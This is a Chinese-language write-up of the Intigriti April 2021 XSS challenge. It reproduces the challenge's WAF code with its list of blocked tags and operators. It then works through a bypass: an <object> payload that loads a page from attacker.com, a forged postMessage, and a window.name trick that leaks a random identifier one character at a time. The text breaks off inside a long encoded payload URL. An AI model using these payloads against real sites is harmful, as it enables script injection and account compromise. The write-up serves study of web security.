> 原文链接: https://www.anquanke.com//post/id/240023 


# Intigriti史上最难XSS挑战Writeup


                                阅读量   
                                **512563**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01b2a51c84236ccb42.png)](https://p4.ssl.qhimg.com/t01b2a51c84236ccb42.png)



## 0x00 前言

Intigriti xxs challenge 0421 被官方自己被评价为目前为止 **Intigriti史上最难的 XSS 挑战**。在有效提交期内，全球参与的 hacker、CFTer、Bugbounty hunter 仅有15人成功通过挑战拿到flag。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017ddd84fdf4b74f38.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0180ec04f41b2f938b.png)

[![](https://p0.ssl.qhimg.com/t01360f471f8067b81a.png)](https://p0.ssl.qhimg.com/t01360f471f8067b81a.png)

[![](https://p5.ssl.qhimg.com/t0177b47cd653698c39.png)](https://p5.ssl.qhimg.com/t0177b47cd653698c39.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d9d9970c5fc1acf5.png)

该挑战由[https://challenge-0421.intigriti.io/](https://challenge-0421.intigriti.io/) ，以下要求：
- 使用最新版的Firefox或者Chrome浏览器
<li>使用`alert()`弹窗`flag`{`THIS_IS_THE_FLAG`}``
</li>
- 利用此页面的xss漏洞
- 不允许self-XSS 和 MiTM 攻击
- 无需用户交互
本人也在提交期内对该挑战进行了尝试，对整个网页以及背后的waf逻辑进行了分析研究，但无奈菜狗一枚，未能在有效提交期内通关。通过赛后公布的poc，对个人思路和通关思路进行复盘，形成本WP，供共同学习交流。感兴趣的小伙伴也可以自行尝试，感受该XSS挑战的难度和乐趣！



## 0x01 代码分析

对题目网页进行分析，主要包括网页源码`(index)`和一个`waf.html`([https://challenge-0421.intigriti.io/waf.html)。](https://challenge-0421.intigriti.io/waf.html)%E3%80%82)

（index）

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
   &lt;head&gt;
      &lt;title&gt;Intigriti April Challenge&lt;/title&gt;
      &lt;meta charset="UTF-8"&gt;
      &lt;meta name="twitter:card" content="summary_large_image"&gt;
      &lt;meta name="twitter:site" content="@intigriti"&gt;
      &lt;meta name="twitter:creator" content="@intigriti"&gt;
      &lt;meta name="twitter:title" content="April XSS Challenge - Intigriti"&gt;
      &lt;meta name="twitter:description" content="Find the XSS and WIN Intigriti swag."&gt;
      &lt;meta name="twitter:image" content="https://challenge-0421.intigriti.io/share.jpg"&gt;
      &lt;meta property="og:url" content="https://challenge-0421.intigriti.io" /&gt;
      &lt;meta property="og:type" content="website" /&gt;
      &lt;meta property="og:title" content="April XSS Challenge - Intigriti" /&gt;
      &lt;meta property="og:description" content="Find the XSS and WIN Intigriti swag." /&gt;
      &lt;meta property="og:image" content="https://challenge-0421.intigriti.io/share.jpg" /&gt;
      &lt;link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&amp;display=swap" rel="stylesheet"&gt;
      &lt;link rel="stylesheet" type="text/css" href="./style.css" /&gt;
      &lt;meta http-equiv="content-security-policy" content="script-src 'unsafe-inline';"&gt;
   &lt;/head&gt;
   &lt;body&gt;
      &lt;section id="wrapper"&gt;
      &lt;section id="rules"&gt;
      &lt;div class="card-container error" id="error-container"&gt;
        &lt;div class="card-content" id="error-content"&gt;
            Error: something went wrong. Please try again!
        &lt;/div&gt;
      &lt;/div&gt;
      &lt;div id="challenge-container" class="card-container"&gt;
         &lt;div class="card-header"&gt;
           &lt;img class="card-avatar" src="./terjanq.png"/&gt;
           Intigriti's 0421 XSS challenge - by &lt;a target="_blank" href="https://twitter.com/terjanq"&gt;@terjanq&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
         &lt;div id="challenge-info" class="card-content"&gt;
            &lt;p&gt;Find a way to execute arbitrary javascript on this page and win Intigriti swag.&lt;/p&gt;
            &lt;b&gt;Rules:&lt;/b&gt;
            &lt;ul&gt;
               &lt;li&gt;This challenge runs from April 19 until April 25th, 11:59 PM CET.&lt;/li&gt;
               &lt;li&gt;
                  Out of all correct submissions, we will draw &lt;b&gt;six&lt;/b&gt; winners on Monday, April 26th:
                  &lt;ul&gt;
                     &lt;li&gt;Three randomly drawn correct submissions&lt;/li&gt;
                     &lt;li&gt;Three best write-ups&lt;/li&gt;
                  &lt;/ul&gt;
               &lt;/li&gt;
               &lt;li&gt;Every winner gets a €50 swag voucher for our &lt;a href="https://swag.intigriti.com" target="_blank"&gt;swag shop&lt;/a&gt;&lt;/li&gt;
               &lt;li&gt;The winners will be announced on our &lt;a href="https://twitter.com/intigriti" target="_blank"&gt;Twitter profile&lt;/a&gt;.&lt;/li&gt;
               &lt;li&gt;For every 100 likes, we'll add a tip to &lt;a href="https://go.intigriti.com/challenge-tips" target="_blank"&gt;announcement tweet&lt;/a&gt;.&lt;/li&gt;
            &lt;/ul&gt;
            &lt;b&gt;The solution...&lt;/b&gt;
            &lt;ul&gt;
               &lt;li&gt;Should work on the latest version of Firefox or Chrome&lt;/li&gt;
               &lt;li&gt;Should &lt;code&gt;alert()&lt;/code&gt; the following flag: &lt;code id="flag"&gt;flag`{`THIS_IS_THE_FLAG`}`&lt;/code&gt;.&lt;/li&gt;
               &lt;li&gt;Should leverage a cross site scripting vulnerability on this page.&lt;/li&gt;
               &lt;li&gt;Shouldn't be self-XSS or related to MiTM attacks&lt;/li&gt;
               &lt;li&gt;Should not use any user interaction&lt;/li&gt;
               &lt;li&gt;Should be reported at &lt;a href="https://go.intigriti.com/submit-solution"&gt;go.intigriti.com/submit-solution&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/div&gt;
      &lt;/div&gt;
      &lt;iframe id="wafIframe" src="./waf.html" sandbox="allow-scripts" style="display:none"&gt;&lt;/iframe&gt;
      &lt;script&gt;
        const wafIframe = document.getElementById('wafIframe').contentWindow;
        const identifier = getIdentifier();

        function getIdentifier() `{`
            const buf = new Uint32Array(2);
            crypto.getRandomValues(buf);
            return buf[0].toString(36) + buf[1].toString(36)
        `}`

        function htmlError(str, safe)`{`
            const div = document.getElementById("error-content");
            const container = document.getElementById("error-container");
            container.style.display = "block";
            if(safe) div.innerHTML = str;
            else div.innerText = str;
            window.setTimeout(function()`{`
              div.innerHTML = "";
              container.style.display = "none";
            `}`, 10000);
        `}`

        function addError(str)`{`
            wafIframe.postMessage(`{`
                identifier,
                str
            `}`, '*');
        `}`

        window.addEventListener('message', e =&gt; `{`
            if(e.data.type === 'waf')`{`
                if(identifier !== e.data.identifier) throw /nice try/
                htmlError(e.data.str, e.data.safe)
            `}`
        `}`);

        window.onload = () =&gt; `{`
            const error = (new URL(location)).searchParams.get('error');
            if(error !== null) addError(error);
        `}`

    &lt;/script&gt;
   &lt;/body&gt;
&lt;/html&gt;
```

waf.html

```
&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;script&gt;

onmessage = e =&gt; `{`
    const identifier = e.data.identifier;
    e.source.postMessage(`{`
        type:'waf',
        identifier,
        str: e.data.str,
        safe: (new WAF()).isSafe(e.data.str)
    `}`,'*');
`}`

function WAF() `{`
    const forbidden_words = ['&lt;style', '&lt;iframe', '&lt;embed', '&lt;form', '&lt;input', '&lt;button', '&lt;svg', '&lt;script', '&lt;math', '&lt;base', '&lt;link', 'javascript:', 'data:'];
    const dangerous_operators = ['"', "'", '`', '(', ')', '`{`', '`}`', '[', ']', '=']

    function decodeHTMLEntities(str) `{`
        var ta = document.createElement('textarea');
        ta.innerHTML = str;
        return ta.value;
    `}`

    function onlyASCII(str)`{`
        return str.replace(/[^\x21-\x7e]/g,'');
    `}`

    function firstTag(str)`{`
        return str.search(/&lt;[a-z]+/i)
    `}`

    function firstOnHandler(str)`{`
        return str.search(/on[a-z]`{`3,`}`/i)
    `}`

    function firstEqual(str)`{`
        return str.search(/=/);
    `}`

    function hasDangerousOperators(str)`{`
        return dangerous_operators.some(op=&gt;str.includes(op));
    `}`

    function hasForbiddenWord(str)`{`
        return forbidden_words.some(word=&gt;str.search(new RegExp(word, 'gi'))!==-1);
    `}`

    this.isSafe = function(str) `{`
        let decoded = onlyASCII(decodeHTMLEntities(str));

        const first_tag = firstTag(decoded);
        if(first_tag === -1) return true;
        decoded = decoded.slice(first_tag);

        if(hasForbiddenWord(decoded)) return false;

        const first_on_handler = firstOnHandler(decoded);
        if(first_on_handler === -1) return true;
        decoded = decoded.slice(first_on_handler)

        const first_equal = firstEqual(decoded);
        if(first_equal === -1) return true;
        decoded = decoded.slice(first_equal+1);

        if(hasDangerousOperators(decoded)) return false;
        return true;
    `}`
`}`

&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
```

代码量不大，运行逻辑也很清晰。在主页中可以看到，首先定义了一个随机值`identifier`:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f14050ec85e3a938.png)

可以在url中引入`error`参数进行有关输入，也能进行html injection：

[![](https://p2.ssl.qhimg.com/t011faeeedbf72378d7.png)](https://p2.ssl.qhimg.com/t011faeeedbf72378d7.png)

[![](https://p3.ssl.qhimg.com/t014198beae9974883c.png)](https://p3.ssl.qhimg.com/t014198beae9974883c.png)

输入值会通过`postMessage`传递给`waf`，该消息`e.data.indentifier`的值为先前生成的随机值，确保交互通信没有被拦截，`e.data.str`的值为我们的输入:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b11c5ffdc40d73b5.png)

输入值经过waf的处理后，会对不安全的输入中的各种字符进行检查，经过处理后对`e.data.safe`打上值，认定输入是否是安全的。当`safe:true`时，通过`htmlError()`方法在页面上通过`innerHTML` `innerText` 显示有关错误信息，可以用于payload的触发。此外，错误信息会在10秒后被删除：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e90e940edcbb0fbb.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d81a1c023f9f6111.png)

此外，该页面响应头还`X-Frame-Options: DENY` ，无法通过外部的`&lt;iframe&gt;`引用：

[![](https://p5.ssl.qhimg.com/t01e8d87f314acc602b.png)](https://p5.ssl.qhimg.com/t01e8d87f314acc602b.png)

下面，对`waf.html`进行分析。waf 规则对一些特殊标签和字符进行了限制：

```
['&lt;style', '&lt;iframe', '&lt;embed', '&lt;form', '&lt;input', '&lt;button', '&lt;svg', '&lt;script', '&lt;math', '&lt;base', '&lt;link', 'javascript:', 'data:']

['"', "'", '`', '(', ')', '`{`', '`}`', '[', ']', '=']
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013bb3d9b978576dba.png)

整个过程是对输入进行纯ascii码、`onXXX`事件、`=`以及包含限制标签和字符的检测。经过调试分析，规则允许注入`onXXX` 事件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0124eb8d645d46661c.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0168b14ed5895b858f.png)

[![](https://p4.ssl.qhimg.com/t0138d6fb769d15c9c9.png)](https://p4.ssl.qhimg.com/t0138d6fb769d15c9c9.png)



## 0x02 思路分析

在有效提交期内，Intigriti 先后总放出7条hits:

> <p>（4.19）First hint: find the objective!<br>
（4.20）Time for another hint! Where to smuggle data?<br>
（4.20）Time for another tip! One bite after another!<br>
（4.20）Here’s an extra tip: ++ is also an assignment<br>
（4.22）Let’s give another hint:”Behind a Greater Oracle there stands one great Identity” (leak it)<br>
（4.23）Tipping time! Goal &lt; object(ive)<br>
（4.24）Another hint: you might need to unload a custom loop!</p>

这里先卖个关子，先不对hits 背后隐藏线索进行解释。感兴趣的小伙伴可以自行尝试，看看能不能通关这个XSS挑战。

结合上面的代码分析，我有了以下思路:

1.寻找一个可以绕过waf 的payload<br>
2.通过`postMessage` 构造合适的消息，达成触发xss的条件<br>
3.突破`identifier`随机值的限制

首先考虑如何绕过waf。由于通过`error`参数值作为的输入需要经过waf的检测，通过前面的分析，waf对很多标签和字符进行了禁止，用于限制恶意代码的执行，可以说规则还是很严格的，很多常用XSS payload 构成方式都不能使用。`'` `"` ` 被禁止，所以JS字串形式无法使用，`[]` ``{``}`` `()` `=` 被禁止，通过函数赋值的形式也无法使用。此外，`X-Frame-Options: DENY`的限制，使得我们无法通过`&lt;iframe&gt;`外部引用执行xss，所以思路转向能能够通过输入，在网页内部嵌入一个外部的恶意站点，用来触发xss。此外，我也发现了`onXXX=`事件可以被插入到输入中，并不被禁止。沿着这两个条件分析，进行了大量的测试，最终发现如下形式的payload可以绕过waf的检测。

```
&lt;object data=XXXXXXX onload=xss&gt;&lt;/object&gt;
```

这里使用了`&lt;object&gt;`标签（不在waf的禁止范围内），它用于引入一个外部资源:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ab3628965773d307.png)

尝试插入我的头像，成功：

```
&lt;object data=https://p5.ssl.qhimg.com/sdm/90_90_100/t0125c3f3f3fc1b13fd.png onload=xss&gt;&lt;/object&gt;
```

[![](https://p1.ssl.qhimg.com/t01bfc5abe262585db5.png)](https://p1.ssl.qhimg.com/t01bfc5abe262585db5.png)

[![](https://p1.ssl.qhimg.com/t0171204d446124eff2.png)](https://p1.ssl.qhimg.com/t0171204d446124eff2.png)

尝试插入一个外部网页，成功

```
&lt;object data=https://attacker.com/xss-poc.html onload=xss&gt;&lt;/object&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01213a77e906916610.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019715ea63ee8bc585.png)

下面，验证通过`window.postMessage`控制消息值，达到触发xss的条件。按照这个思路，验证self-xss可行性。可以看到当我们的输入经过waf处理后，`e.data.type='waf'` `e.data.identifer='(事先生成的随机值)''` `e.data.str='payload'` `e.data.safe='true'or 'false'`：

[![](https://p1.ssl.qhimg.com/t0146786909ce96327d.png)](https://p1.ssl.qhimg.com/t0146786909ce96327d.png)

从前面的分析可以知道，只有`safe=true`时，构造的payload才能被赋值给`div.innerHTML`。结合上述条件，这里构造消息信息如下，传递时为`e`，即可绕过waf的过滤检测：

```
window.postMessage(`{`
        type: 'waf',
        identifier: "tze8f445ssb7",
        str: '&lt;img src=x onerror=alert("flag`{`THIS_IS_THE_FLAG`}`")&gt;',
        safe: true
      `}`, '*')
```

[![](https://p3.ssl.qhimg.com/t0114e7a8ce30bbf1d8.png)](https://p3.ssl.qhimg.com/t0114e7a8ce30bbf1d8.png)

通过`postMessage`触发xss的思路可行，仅在self-xss条件下可行，因为`identifier`的值是随机生成的，需要突破该限制。

截止目前，我的思路整理如下：
- 绕过waf （构造形如`&lt;object data=XXXXXXX onload=xss&gt;&lt;/object&gt;`的payload可以bypass waf，同时`onXXX=`没有被禁止，可以加载外部页面 ）
- 通过`postMessage`触发xss（self-xss验证可行，可以通过外部页面发送消息）
- 突破`identifier`随机值的限制
为了突破`identifier`随机值的限制，我首先想到的是能不能像**SQLi 盲注那这样通过特定的反馈，将值一位一位的试出来**。由于`identifier`是本站生成的，如何在跨站的条件下降该值泄露出来，是关键点的思路。此外，我还发现了一些有趣的点： `window.neme=""` 可能可以利用，通过特殊方式的将泄露出的字段写入`top.name`中。

为了能将`identifier`一位一位泄露出来，需要构造比较。它的构成只包含`0-9a-z`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d84fa0cb882cc910.png)

那么如何判断每一位值是多少呢，这有由于禁止`[]`，所以无法使用`identifier[i]`的形式来构造字串进行按位比较。不过我们可以利用以下的规律：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0198911e7e8778e59e.png)

可以看到这里`identifier="tze8f445ssb7"` 第一位是`t`，当比较字符小于`t`时，均返回`false`，当比较字符为`u`时，返回`true`，由此我们可以判定第一位为`t`。保留`t`，继续构造第二位`t?`进行比较：

[![](https://p3.ssl.qhimg.com/t018dcb45d30df45e99.png)](https://p3.ssl.qhimg.com/t018dcb45d30df45e99.png)

那么按照这个规律，构造循环进行比较，当每次返回`true`时，即可判断出当前位的值，同时还需要对前面确定的值保存，才能继续判断下一位。我的思路是通过特定的方法构造这个循环，并通过`window.neme=""`可以利用的特性，当一个中间的数据”寄存器”。

首先，为了推算`identifier`第一位，构造如下结构payload：

```
error=&lt;object data=https://baidu.com/ onload=location.hash+/0/.source&lt;identifier&amp;&amp;window.name++&gt;&lt;/object&gt;#

```

这里，当`location.hash+/0/.source&lt;identifier`即`'0'&lt;'t'`成立，然后`&amp;&amp;window.name++` ，即`window.name` +1。通过`onload`事件重复这个过程，即可在一轮比较后，通过`window.name`的值-1，按照`0-9a-z`的顺序序号，即可推算出`identifier`第一位的值。这里需要注意，对`&amp;` `+` 进行url编码，否则，在运行过程中会被截断，造成payload因不完整无法执行(`&amp;&amp; --&gt; %26%26` `++ --&gt; %2b%2b`)，还需要额外添加`~`用来检测`z`：

```
https://challenge-0421.intigriti.io/
?error=&lt;object data=https://attacker.com/poc.html
onload=location.hash+/0/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/1/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/2/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/3/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/4/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/5/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/6/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/7/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/8/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/9/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/a/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/b/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/c/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/d/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/e/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/f/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/g/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/h/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/i/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/j/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/k/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/l/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/m/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/n/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/o/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/p/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/q/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/r/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/s/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/t/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/u/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/v/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/w/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/x/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/y/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/z/.source&lt;identifier&amp;&amp;window.name++,
location.hash+/~/.source&lt;identifier&amp;&amp;window.name++&gt;&lt;/object&gt;#
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e0c7265f1468262f.png)

可以看到，该payload成功定位到`identifier`的第一位值。现在需要构造循环，通过13次上述操作（长度为13位），将`identifier`的值全部泄露出来，每个循环开始前还需要将`window.name`归零。

当我们将外部POC页面嵌入题目页面后，尝试利用POC页面获取`top.name`来控制题目页面`window.name`的时候，发现跨域拦截：

[![](https://p0.ssl.qhimg.com/t01e45d7ab2e342619d.png)](https://p0.ssl.qhimg.com/t01e45d7ab2e342619d.png)

那么，现在还需要突破跨域获取`top.name`的限制。经过大量的尝试，一直到提交期截止，也没能找到合适的方式，来捕获用于泄露`identifier`的`window.name`。因为不重新加载窗口的情况下，直接读取跨源资源的`window.name`是不可能的。

通过对赛后POC的思路启发，这里利用了一个特别巧妙的方法。举个例子，当我们执行`window.open("http://XXXX",66)`时，就会弹出一个`window.name='66'`的窗口。但如果已经有一个窗口为`66`，就会执行重定向到该窗口而不是重新弹出。有了这个特性，可以通过一种“试”的方法，暴力测试我们想要获取的题目页面的`window.name`。

这里使用了一个`&lt;iframe sanbox=...&gt;` 来调用`window.open()`，允许top导航变化，但会禁止弹出。

```
&lt;iframe sandbox="allow-scripts allow-top-navigation allow-same-origin" name="xss"&gt;&lt;/iframe&gt;
```

同时，当测试出的`window.name`值与实际值一致时，防止真的重定向发生，设置一个无效的协议`xxxx://no-trigger`。这里进行一个简单的验证，例如打开一个`window.name='6'` 的题目页面，通过`&lt;object`payload 将poc.html嵌入，poc.html首内包含测试`window.name`值的代码：

```
&lt;script&gt;
window.open("https://challenge-0421.intigriti.io/?error=&lt;object data='https://xss-poc.***/poc.html'&gt;&lt;/object&gt;",3)

function getTopName() `{`
  let i = 0;
  for (; i &lt; 10; i++) `{`
    let res =  ( () =&gt; `{`
      let x;
      try `{`
        // shouldn't trigger new navigation
        x = xss.open('xss://xss', i);
        // this is for firefox
        if (x !== null) return 1;
        return;
      `}` catch (e) `{``}`
    `}`)();
    if (res) break;
  `}`
  return i;
`}`

topName = getTopName();
console.log("top_window.name"+topName);
&lt;/script&gt;
```

当我们打开poc.html后，会弹出`https://challenge-0421.intigriti.io/?error=&lt;object data='https://attacker.com/poc.html`，在新打开的题目页面，会嵌入`https://xss-poc.***/poc.html`，然后执行代码，测出题目页`window.name`值，也就是我们需要的`top.name`，这样便能突破`window.name`跨域获取的限制:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d45056b857ca3596.png)

例如，结合前面的payload，成功获取`identifier`第一位对应的`window.name`值：

```
&lt;body&gt;
  &lt;h1&gt;xss poc&lt;/h1&gt;
   &lt;span&gt;Leaked identifier: &lt;code id=leakedIdentifier&gt;&lt;/code&gt;&lt;/span&gt;
   &lt;iframe sandbox="allow-scripts allow-top-navigation allow-same-origin" name="xss"&gt;&lt;/iframe&gt;
&lt;script&gt;
  window.open("https://challenge-0421.intigriti.io/?error=&lt;object data=https://xss-poc.****/poc.html onload=location.hash%2B%2F0%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F1%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F2%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F3%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F4%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F5%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F6%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F7%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F8%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F9%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fa%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fb%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fc%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fd%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fe%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Ff%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fg%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fh%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fi%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fj%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fk%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fl%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fm%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fn%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fo%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fp%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fq%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F